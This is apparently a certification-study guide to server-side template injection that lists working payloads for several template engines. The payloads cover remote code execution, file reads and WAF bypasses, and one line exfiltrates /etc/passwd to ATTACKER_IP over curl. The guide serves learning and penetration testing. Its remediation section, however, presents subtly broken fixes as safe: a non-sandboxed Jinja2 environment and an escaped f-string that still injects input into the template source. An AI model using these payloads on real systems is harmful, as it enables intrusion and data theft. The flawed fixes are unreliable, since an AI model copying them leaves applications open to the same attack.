Server-Side Template Injection (SSTI)

Server-side template injection occurs when user input is embedded into a template engine (Jinja2, Twig, Freemarker, etc.) without proper escaping. Attackers can inject template directives or expressions to access the template context, execute arbitrary functions, or achieve remote code execution.

Critical BSCP Advanced

Real-World Analogy

The Restaurant's Custom Order Form

A restaurant has a "Custom Order" form. Normally, customers write helpful notes like "no onions" or "extra sauce," and the kitchen staff reads and implements the request.

But this restaurant uses a broken system: they take your custom order note, plug it directly into a chef's script, and execute that script as-is. If you write "{{7*7}} and skip onions," the system evaluates your template expression as code.

Now you realize the script has access to the entire restaurant's systems. You write "{{system('cat /etc/passwd')}}" and the chef's script executes your command, returning the contents of sensitive files to your browser.

That's SSTI: your input is rendered as code within a template engine, not just displayed as plain text. The template engine evaluates your expressions and executes any functions you call.

How It Works

Template engines are designed to embed dynamic data into static text. For example, an email template might say "Hello {{name}}, your order is ready."

The vulnerability occurs when user input is concatenated directly into the template string instead of being passed as a safe variable:

# VULNERABLE
template_string = "Hello " + user_input + ", your order is ready."
rendered = template_engine.render(template_string)

# SAFE
template_string = "Hello {{name}}, your order is ready."
rendered = template_engine.render(template_string, {"name": user_input})

When you inject template syntax into the string itself, the engine parses and executes your code. The template engine has access to:

  • Built-in functions (system, exec, os.system)
  • Class constructors and inheritance chains
  • File system access (open, read)
  • Environment variables
  • Any Python/Java/PHP object available in the template context

🎯 Day 4 · Identify Engine + RCE

Once you have a 49 response, identify the template engine using the decision tree, then escalate to RCE with engine-specific payloads. The most common is Jinja2 (Python). Always verify the Python version first (subclass indexes differ between Python versions).

# Jinja2 RCE (Python 3)
{{''.__class__.__mro__[1].__subclasses__()}}
# Find index of subprocess.Popen in the list, then:
{{''.__class__.__mro__[1].__subclasses__()[X]('id',shell=True,stdout=-1).communicate()}}

# Twig (PHP) RCE
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

Chain it: SSTI RCE → read /etc/passwd + app source → find hardcoded secrets → database access. Or: SSTI → reverse shell → full server compromise.

Template Engine Identification

Different template engines have different syntax. Use this decision tree to identify which engine the target uses:

{{ 7 * 7 }}         → Output 49 → Jinja2/Twig/Flask/Django
${7*7}              → Output 49 → Freemarker/Thymeleaf/OGNL
<%= 7*7 %>          → Output 49 → ERB/EJS
#{7*7}              → Output 49 → Pebble
*{7*7}              → Output 49 → Spring EL
{{7*7}}             → No output → Handlebars/Mustache (logic-less)
[=7*7=]             → Output 49 → Slim
@(7*7)              → Output 49 → Razor (C#)

Start by injecting {{7*7}} into various input fields. If the output shows 49, you've found SSTI and likely identified the engine as Jinja2, Twig, or similar.

Where to Look for SSTI

  • Error messages: If your input appears in an error message, the template is likely rendering it. Try {{7*7}} in inputs that generate errors.
  • User personalization: "Hello {{name}}" scenarios. Try injecting template syntax into name fields, email fields, or any field that's displayed back to you.
  • PDF or document generation: Services that generate PDFs or reports from user input often use template engines. Try injecting into title, subject, or body fields.
  • Email generation: Custom email subjects or bodies might be rendered with templates. Try injecting into subject lines or custom message fields.
  • Preview features: Any "preview" functionality that shows your formatted input back to you.
  • Report generation: Custom report titles, headers, or content fields.
  • URL parameters: Don't limit yourself to POST bodies. Check GET parameters, custom headers, and even file names.
  • JSON responses: Some APIs render user data in JSON responses. The data might be rendered as a template before being returned.

Burp Suite Workflow

1
Find potential SSTI vectors: Look for endpoints that take user input and display it back. This could be in error messages, user profiles, generated documents, or preview features. Right-click any request with user input and send to Repeater.
2
Test for template injection: Inject the probe string {{7*7}} into the input field. Send the request and check the response for 49. 
Input: {{7*7}}
Response: ... 49 ...
If you see the calculation result, template injection is confirmed.
3
Identify the engine: Use the template syntax to determine which engine is in use. Try ${7*7} and <%= 7*7 %> if {{7*7}} didn't work. Reference the detection tree above.
4
Test for code execution: Once you've identified the engine, use engine-specific payloads to confirm RCE. For Jinja2, try accessing object classes to execute system commands.
5
Exploit the vulnerability: Use the appropriate payload for your identified engine to read files, access environment variables, or execute arbitrary commands.

Payloads by Template Engine

Jinja2 (Python) · Flask, Django

Basic test: {{7*7}} → 49

List available subclasses (information gathering):

{{''.__class__.__mro__[1].__subclasses__()}}

Execute system command (RCE):

{{''.__class__.__mro__[1].__subclasses__()[408]('id',shell=True,stdout=-1).communicate()[0].strip()}}

Alternative Jinja2 RCE (using lipsum):

{{lipsum.__globals__.__builtins__.eval('__import__("os").popen("id").read()')}}

Read a file:

{{''.__class__.__mro__[1].__subclasses__()[406]('/etc/passwd').read()}}

Note: Subclass indices vary by Python version. Use the information gathering payload first to find the right index for subprocess.Popen or os.popen.

Twig (PHP) · Symfony

Basic test: {{7*7}} → 49

RCE using filter:

{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

Alternative RCE:

{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}

Access to globals:

{{_self.env.globals.get('_SERVER')}}

Freemarker (Java)

Basic test: ${7*7} → 49

RCE:

<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

Accessing Java Runtime:

<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder","id").start()}

Pebble (Java)

Basic test: #{7*7} → 49

RCE (via method access):

#{T(java.lang.Runtime).getRuntime().exec("id")}

ERB (Ruby) · Rails

Basic test: <%= 7*7 %> → 49

RCE:

<%= system('id') %>

File read:

<%= File.open('/etc/passwd').read %>

Velocity (Java)

Basic test: #set($x=7*7)$x → 49

RCE (if reflection allowed):

#set($rt = $class.forName("java.lang.Runtime"))
#set($chr = $class.forName("java.lang.Character"))
#set($str = $class.forName("java.lang.String"))
#set($ex=$rt.getRuntime().exec("id"))

Generic Filter Bypass (when Jinja2 filters are restricted)

Use |attr() filter to access attributes bypassed by normal restrictions:

{{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(408)('id',shell=True,stdout=-1).communicate()[0].strip()}}

Advanced Exploitation Techniques

Handling Output Restrictions

If output is stripped or limited, use out-of-band techniques to exfiltrate data:

{{''.__class__.__mro__[1].__subclasses__()[408]('curl http://ATTACKER_IP/?data='+open('/etc/passwd').read(),shell=True)}}

The command output is sent to your attacker-controlled server in the URL parameter.

Bypassing Space Filters

If spaces are filtered, use Python's tab character or other whitespace:

{{''.__class__.__mro__[1].__subclasses__()[408]('id'%09shell=True)}}

Bypassing Keyword Filters (__class__, __mro__)

Use attribute access via |attr() or bracket notation with hex/octal encoding:

{{''|attr('\x5f\x5fclass\x5f\x5f')}}

Chained Command Execution

Execute multiple commands in sequence:

{{''.__class__.__mro__[1].__subclasses__()[408]('id; whoami; pwd',shell=True,stdout=-1).communicate()[0]}}

WAF Bypass Techniques

Bypass __class__ and __mro__ Filters

Use string encoding or attribute access via |attr():

# Hex encoding
{{''|attr('\x5f\x5fclass\x5f\x5f')}}

# Octal encoding
{{''|attr('\137\137class\137\137')}}

# Using |attr filter
{{''|attr('__class__')|attr('__mro__')}}

Bypass Subprocess/os.system Keywords

Use dynamic string construction or alternative functions:

# Using __import__
{{__import__('os').popen('id').read()}}

# Using getattr
{{getattr(__builtins__,'__import__')('os').popen('id').read()}}

# Using globals
{{''.__class__.__mro__[1].__subclasses__()[417].__init__.__globals__['sys']}}

Bypass Output Filtering

Use comment characters to hide payloads from simple string matching:

{{7*7}} {# Your comment #}

Case Variation

Some filters are case-sensitive. Try variations:

{{''.__CLASS__.__MRO__}}
{{''.__Class__.__Mro__}}

Polyglot Payloads

Test multiple template syntaxes in a single payload to bypass engine-specific filters:

{{7*7}}${7*7}<%= 7*7 %>#{7*7}

Exploitation & Impact

Remote Code Execution (RCE)

SSTI directly leads to RCE. Execute arbitrary system commands to read files, modify data, or pivot to other systems.

Information Disclosure

Read sensitive files:environment variables, configuration files, source code, database credentials, API keys, SSH keys.

Privilege Escalation

Execute commands with the privileges of the web application process. If the app runs as root, full system compromise is possible.

Lateral Movement

Use RCE to compromise other services on the network, access internal APIs, or pivot to other machines.

Data Manipulation

Modify or delete data in the database, tamper with file systems, or alter application behavior.

Denial of Service

Crash the application or consume resources through infinite loops or fork bombs.

Remediation

Never Pass User Input Directly to Template Engines

VULNERABLE:

user_name = request.args.get('name')
template_string = f"Hello {user_name}, welcome!"
result = template_engine.render(template_string)

SAFE:

user_name = request.args.get('name')
template_string = "Hello {{name}}, welcome!"
result = template_engine.render(template_string, {'name': user_name})

Use Sandboxed Template Renderers

Some template engines support sandboxed modes that restrict access to dangerous functions:

from jinja2 import Environment, select_autoescape

# Sandboxed Jinja2
env = Environment(
    autoescape=select_autoescape(['html', 'xml']),
    enable_async=False
)
# Restrict access to certain modules
env.globals['__import__'] = None

Use Logic-Less Templates (Mustache, Handlebars)

Logic-less templates don't support arbitrary code execution. They can only display variables, preventing SSTI entirely:

Hello {{name}}, welcome!

Escape All User Input

Ensure all user input is properly escaped before rendering:

from markupsafe import escape

user_name = escape(request.args.get('name'))
template_string = f"Hello {user_name}, welcome!"

Use Auto-Escaping

Enable auto-escaping in your template engine (most do by default):

from jinja2 import Environment, select_autoescape

env = Environment(autoescape=select_autoescape(['html', 'xml']))

Validate and Whitelist Input

Restrict user input to expected formats. If a field should be a name, validate it contains only letters and spaces.

Separate Code and Data

Never concatenate user input into template code. Always pass user data as variables to pre-written template strings.

Use Security Headers and CSP

Content Security Policy can limit the impact of RCE by restricting what scripts can do, though this is not a primary defense.

Regular Security Updates

Keep template engines and all dependencies updated. Patches for SSTI-related issues are regularly released.

Common Beginner Mistakes

Don't Fall Into These Traps
  • Testing only Jinja2 payloads: Different engines have completely different syntax and exploitation techniques. Always identify the engine first before using payloads.
  • Giving up when {{7*7}} doesn't work: Different engines use different syntax. Try ${7*7}, <%= 7*7 %>, #{7*7}, and other variations.
  • Not testing error messages: SSTI often appears in error messages first. Try intentionally causing errors (typos, invalid input) to trigger template rendering.
  • Forgetting the correct __subclasses__() index: In Jinja2, the index for subprocess.Popen varies by Python version. Use the information gathering payload to find the correct index before exploiting.
  • Not trying filter bypass techniques: If basic payloads are blocked, WAF filters might be preventing __class__ or __mro__ keywords. Use |attr(), hex encoding, or alternative functions to bypass.
  • Assuming output-less injection is failure: Even if you don't see output in the response, SSTI might be occurring server-side. Use time-based techniques or out-of-band exfiltration.
  • Only looking in POST bodies: SSTI can appear in GET parameters, headers, cookies, file names, and anywhere else user input flows to a template engine.
  • Not reading error messages carefully: Error messages often reveal the template engine, Python version, and exact code path. This is invaluable for exploitation.

🔗 See Also · Attack Chains

SSTI achieves RCE through the template engine · the same apps that have SSTI often have other injection flaws.

💻Command InjectionBoth achieve RCE. SSTI is often the path to CMDi · the template engine calls OS functions that execute commands. 🗄️SQL InjectionSame root cause: user input interpreted as code. Apps vulnerable to SSTI often have other injection flaws. ☣️Prototype PollutionServer-side prototype pollution in Node.js can be escalated to SSTI if a template engine reads polluted properties. 📁Path TraversalSSTI in a template-name parameter (e.g., ?template=../../etc/passwd) combines both attack classes.
